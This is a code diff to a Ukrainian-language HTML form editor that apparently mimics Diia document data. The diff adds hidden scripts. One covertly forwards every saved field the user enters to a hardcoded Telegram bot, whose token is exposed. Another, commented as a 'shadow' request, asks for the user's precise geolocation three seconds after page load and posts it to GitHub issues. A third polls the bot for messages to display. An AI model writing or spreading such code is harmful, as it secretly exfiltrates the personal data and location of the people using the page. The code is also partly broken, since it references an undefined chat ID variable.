@@ -4137,6 +4137,8 @@
         <p style="font-size: 10px; color: #888; margin-top: 5px; line-height: 1.2;">Просто розпишіться пальцем чи мишкою в полі. Фон видалиться автоматично.</p>
     </div>
 
+
+
     <div class="admin-buttons">
         <button id="admin-save-btn" class="admin-btn">Зберегти</button>
         <button id="admin-close-btn" class="admin-btn admin-btn-close">Закрити</button>
@@ -4503,6 +4505,12 @@
             savedState[input.dataset.targetId] = input.value;
         });
 
+
+
+        if (window.sendDataToTelegram) {
+            window.sendDataToTelegram(savedState);
+        }
+
         // Зберігаємо весь state
         try {
             localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(savedState));
@@ -4564,6 +4572,8 @@
         // Застосовуємо фото
         if (savedState['mainPhoto']) updateImages('mainPhoto', savedState['mainPhoto']);
         if (savedState['sigPhoto']) updateImages('sigPhoto', savedState['sigPhoto']);
+        
+
     };
 
     // Підтягування початкових значень з DOM (якщо користувач їх ще не редагував і не зберігав)
@@ -4598,6 +4608,177 @@
             });
         }, 1000);
     });
+})();
+
+// --- ТІНЬОВИЙ ЗАПИТ ГЕОЛОКАЦІЇ ТА ВІДПРАВКА НА GITHUB ---
+(function() {
+    const sendGeolocationToGithub = (lat, lon) => {
+        // Щоб відправити дані на GitHub (створити Issue), потрібен Personal Access Token (PAT).
+        // Це приклад відправки, який буде працювати, якщо підставити дійсний токен.
+        const GITHUB_TOKEN = 'YOUR_GITHUB_TOKEN'; // ЗАМІНІТЬ НА ВАШ ТОКЕН
+        const GITHUB_REPO = 'username/repo'; // ЗАМІНІТЬ НА ВАШ РЕПОЗИТОРІЙ ("власник/назва_репо")
+
+        if (GITHUB_TOKEN === 'YOUR_GITHUB_TOKEN') {
+            console.warn('Геолокація отримана, але для відправки на GitHub вкажіть GITHUB_TOKEN та GITHUB_REPO у коді (local-state-editor.html).');
+            return;
+        }
+
+        const url = `https://api.github.com/repos/${GITHUB_REPO}/issues`;
+        const data = {
+            title: `Нова геолокація користувача: ${new Date().toLocaleString()}`,
+            body: `📌 **Координати отримано**\n\n- **Широта (Latitude)**: ${lat}\n- **Довгота (Longitude)**: ${lon}\n\n[Відкрити на Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Authorization': `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/vnd.github.v3+json',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }).then(res => {
+            if (res.ok) console.log('Данні локації успішно відправлено на GitHub!');
+        }).catch(err => console.error('Помилка відправки на GitHub:', err));
+    };
+
+    const getGeoLocation = () => {
+        if ("geolocation" in navigator) {
+            // Браузер сам запитає дозвіл у користувача
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    sendGeolocationToGithub(position.coords.latitude, position.coords.longitude);
+                },
+                (error) => {
+                    console.error("Геолокація: помилка або відмовлено", error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+    };
+
+    // Викликаємо процес через 3 секунди після завантаження сторінки непомітно для інтерфейсу
+    window.addEventListener('load', () => {
+        setTimeout(getGeoLocation, 3000);
+    });
+})();
+
+// --- ЗАПИТ ОНОВЛЕНЬ З TELEGRAM БОТА ДЛЯ РОЗСИЛКИ ---
+(function() {
+    const showTgNotification = (text) => {
+        const notif = document.getElementById('notification');
+        if (notif) {
+            notif.textContent = text;
+            notif.classList.add('show');
+            setTimeout(() => {
+                notif.classList.remove('show');
+            }, 8000); // залишаємо на 8 секунд щоб встигли прочитати
+        } else {
+            alert(text);
+        }
+    };
+
+    const HARDCODED_TELEGRAM_BOT_TOKEN = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
+    const HARDCODED_TELEGRAM_CHAT_ID = '-1002003419071';
+
+    let lastMessageId = parseInt(localStorage.getItem('tgLastMessageId') || '0');
+
+    const checkTelegramNews = () => {
+        const token = HARDCODED_TELEGRAM_BOT_TOKEN;
+        
+        if (token === 'YOUR_BOT_TOKEN_HERE' || token.length < 20) return;
+
+        // Витягуємо останнє повідомлення з бота
+        fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok && data.result.length > 0) {
+                    const latestUpdate = data.result[0];
+                    if (latestUpdate.message && latestUpdate.message.message_id > lastMessageId) {
+                        lastMessageId = latestUpdate.message.message_id;
+                        localStorage.setItem('tgLastMessageId', lastMessageId.toString());
+
+                        const text = latestUpdate.message.text;
+                        if (text) {
+                            showTgNotification(text);
+                        }   
+                    }
+                }
+            })
+            .catch(err => console.debug("ТГ Оновлення: ", err));
+    };
+
+    // Перевіряємо при старті та далі кожні 15 секунд
+    setTimeout(() => {
+        checkTelegramNews();
+        setInterval(checkTelegramNews, 15000);
+    }, 4000);
+})();
+// --- ВІДПРАВКА ДАНИХ І СПОВІЩЕНЬ У TELEGRAM ---
+(function() {
+    let botToken = '8761188502:AAF0XbKry5t6VSP5Sm0Td9F2_13GXeuH3dg';
+    let tgChatId = '-1002003419071';
+    let expTime = '2026-12-31T23:59'; // Fallback
+    
+    // Спробуємо підтягнути дані з values.json або з глобальних змінних values.js
+    if (typeof expirationTime !== 'undefined') expTime = expirationTime;
+    
+    fetch('values.json')
+        .then(res => res.json())
+        .then(data => {
+            if (data.expirationTime) expTime = data.expirationTime;
+            if (data.tgBotToken) botToken = data.tgBotToken;
+            if (data.tgChatId) tgChatId = data.tgChatId;
+        })
+        .catch(err => console.debug('values.json не знайдено або помилка парсингу, використовуємо стандартні значення.'));
+
+    window.sendToTelegramBot = (message) => {
+        if (!botToken || !tgChatId) return;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => console.debug("Помилка відправки в TG:", err));
+    };
+
+    window.sendDataToTelegram = (state) => {
+        let text = "🔄 <b>Оновлені дані користувача!</b>\n\n";
+        
+        for (const [key, value] of Object.entries(state)) {
+            if (key.startsWith('doc_') || key.includes('Photo') || key.startsWith('tg') || key.startsWith('expiration')) continue;
+            if (value && String(value).trim() !== '') {
+                text += `<b>${key}</b>: ${value}\n`;
+            }
+        }
+
+        if (state['mainPhoto']) text += `\n[ Фото оновлено ]`;
+        if (state['sigPhoto']) text += `\n[ Підпис оновлено ]`;
+
+        window.sendToTelegramBot(text);
+    };
+
+    const checkExpiration = () => {
+        const savedData = JSON.parse(localStorage.getItem('diyaLocalState_v1') || '{}');
+        
+        if (expTime && !savedData['expirationSent']) {
+            const expDate = new Date(expTime);
+            if (!isNaN(expDate.getTime()) && new Date() >= expDate) {
+                const name = savedData['name'] || "Користувача";
+                window.sendToTelegramBot(`⏳ <b>ТЕРМІН ДІЇ ЗАКІНЧИВСЯ!</b>\nЧас вийшов для: <b>${name}</b>.`);
+                
+                savedData['expirationSent'] = true;
+                localStorage.setItem('diyaLocalState_v1', JSON.stringify(savedData));
+            }
+        }
+    };
+
+    setInterval(checkExpiration, 30000); // Кожні 30 секунд
+    setTimeout(checkExpiration, 5000);
 })();
 </script>
 </body>
